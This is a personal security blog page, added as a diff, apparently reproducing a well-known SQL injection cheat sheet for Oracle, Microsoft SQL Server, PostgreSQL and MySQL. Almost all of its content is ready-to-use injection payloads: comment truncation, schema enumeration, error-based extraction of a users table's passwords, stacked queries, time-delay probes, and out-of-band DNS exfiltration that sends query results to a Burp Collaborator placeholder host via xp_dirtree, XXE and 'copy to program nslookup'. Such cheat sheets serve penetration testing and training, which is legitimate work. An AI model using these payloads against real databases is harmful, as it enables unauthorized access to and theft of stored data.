@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KageHayashi" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      SQL Injection 
+      
+      
+      |
+    
+     KageHayashi
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/t-apple-touch-icon.png">
+    <link rel="icon" href="/images/takeda_white_small.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Nunito&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Kanit&display=swap" rel="stylesheet">
+
+<div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img id="author_photo" src="/images/light.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">KageHayashi</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/cheatsheets/">
+          <a href="/cheatsheets/">Cheat Sheets</a>
+        </li>
+      
+        <li class="nav-item" data-path="/shells/">
+          <a href="/shells/">Shells</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">SQL Injection</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-03-05 21:31:02
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="String-concatenation"><a href="#String-concatenation" class="headerlink" title="String concatenation"></a>String concatenation</h2><p>You can concatenate together multiple strings to make a single string.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td><code>&#39;foo&#39;|&#39;bar&#39;</code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>&#39;foo&#39;+&#39;bar&#39;</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>&#39;foo&#39;|&#39;bar&#39;</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>&#39;foo&#39; &#39;bar&#39;</code> [Note the space between the two strings]  <br><code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td>
+</tr>
+</tbody></table>
+<h2 id="Substring"><a href="#Substring" class="headerlink" title="Substring"></a>Substring</h2><p>You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string <code>ba</code>.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td><code>SUBSTR(&#39;foobar&#39;, 4, 2)</code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
+</tr>
+</tbody></table>
+<h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td><code>--comment   </code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>--comment   /*comment*/</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>--comment   /*comment*/</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>#comment</code>  <br><code>-- comment</code> [Note the space after the double dash]  <br><code>/*comment*/</code></td>
+</tr>
+</tbody></table>
+<h2 id="Database-version"><a href="#Database-version" class="headerlink" title="Database version"></a>Database version</h2><p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td><code>SELECT banner FROM v$version   SELECT version FROM v$instance   </code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>SELECT @@version</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT version()</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT @@version</code></td>
+</tr>
+</tbody></table>
+<h2 id="Database-contents"><a href="#Database-contents" class="headerlink" title="Database contents"></a>Database contents</h2><p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td><code>SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;   </code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;   </code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;   </code></td>
+</tr>
+</tbody></table>
+<h2 id="Conditional-errors"><a href="#Conditional-errors" class="headerlink" title="Conditional errors"></a>Conditional errors</h2><p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td>
+</tr>
+</tbody></table>
+<h2 id="Extracting-data-via-visible-error-messages"><a href="#Extracting-data-via-visible-error-messages" class="headerlink" title="Extracting data via visible error messages"></a>Extracting data via visible error messages</h2><p>You can potentially elicit error messages that leak sensitive data returned by your malicious query.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Microsoft</td>
+<td><code>SELECT &#39;foo&#39; WHERE 1 = (SELECT &#39;secret&#39;)      &gt; Conversion failed when converting the varchar value &#39;secret&#39; to data type int.</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)      &gt; invalid input syntax for integer: &quot;secret&quot;</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT &#39;foo&#39; WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT &#39;secret&#39;)))      &gt; XPATH syntax error: &#39;\secret&#39;</code></td>
+</tr>
+</tbody></table>
+<h2 id="Batched-or-stacked-queries"><a href="#Batched-or-stacked-queries" class="headerlink" title="Batched (or stacked) queries"></a>Batched (or stacked) queries</h2><p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td><code>Does not support batched queries.</code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>QUERY-1-HERE; QUERY-2-HERE   QUERY-1-HERE QUERY-2-HERE</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
+</tr>
+</tbody></table>
+<h2 id="Time-delays"><a href="#Time-delays" class="headerlink" title="Time delays"></a>Time delays</h2><p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT pg_sleep(10)</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT SLEEP(10)</code></td>
+</tr>
+</tbody></table>
+<h2 id="Conditional-time-delays"><a href="#Conditional-time-delays" class="headerlink" title="Conditional time delays"></a>Conditional time delays</h2><p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &#39;a&#39;|dbms_pipe.receive_message((&#39;a&#39;),10) ELSE NULL END FROM dual</code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),&#39;a&#39;)</code></td>
+</tr>
+</tbody></table>
+<h2 id="DNS-lookup"><a href="#DNS-lookup" class="headerlink" title="DNS lookup"></a>DNS lookup</h2><p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use <a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td>(<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">XXE</a>) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br><br><code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code><br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<br><br><code>SELECT UTL_INADDR.get_host_address(&#39;BURP-COLLABORATOR-SUBDOMAIN&#39;)</code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>exec master..xp_dirtree &#39;//BURP-COLLABORATOR-SUBDOMAIN/a&#39;</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>copy (SELECT &#39;&#39;) to program &#39;nslookup BURP-COLLABORATOR-SUBDOMAIN&#39;</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>The following techniques work on Windows only:<br><br><code>LOAD_FILE(&#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;)</code>  <br><code>SELECT ... INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code></td>
+</tr>
+</tbody></table>
+<h2 id="DNS-lookup-with-data-exfiltration"><a href="#DNS-lookup-with-data-exfiltration" class="headerlink" title="DNS lookup with data exfiltration"></a>DNS lookup with data exfiltration</h2><p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use <a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td><code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#39;|(SELECT YOUR-QUERY-HERE)|&#39;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.BURP-COLLABORATOR-SUBDOMAIN/a&quot;&#39;)</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := &#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;|p|&#39;.BURP-COLLABORATOR-SUBDOMAIN&#39;&#39;&#39;;   execute c;   END;   $$ language plpgsql security definer;   SELECT f();</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>The following technique works on Windows only:  <br><code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<p>References:<br><a target="_blank" rel="noopener" href="https://pentestmonkey.net/category/cheat-sheet/sql-injection">https://pentestmonkey.net/category/cheat-sheet/sql-injection</a><br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-03-05 21:31:02
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#String-concatenation"><span class="toc-text">String concatenation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Substring"><span class="toc-text">Substring</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Comments"><span class="toc-text">Comments</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Database-version"><span class="toc-text">Database version</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Database-contents"><span class="toc-text">Database contents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conditional-errors"><span class="toc-text">Conditional errors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extracting-data-via-visible-error-messages"><span class="toc-text">Extracting data via visible error messages</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Batched-or-stacked-queries"><span class="toc-text">Batched (or stacked) queries</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Time-delays"><span class="toc-text">Time delays</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conditional-time-delays"><span class="toc-text">Conditional time delays</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-lookup"><span class="toc-text">DNS lookup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-lookup-with-data-exfiltration"><span class="toc-text">DNS lookup with data exfiltration</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/kagehayashi">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/kagehayashi">Copyright © 2024 KageHayashi</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        ▰▰▰
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + SQL%20Injection + '&url=' + https%3A%2F%2Fkagehayashi.com%2Fsqli%2Findex.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://kagehayashi.com/sqli/index.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
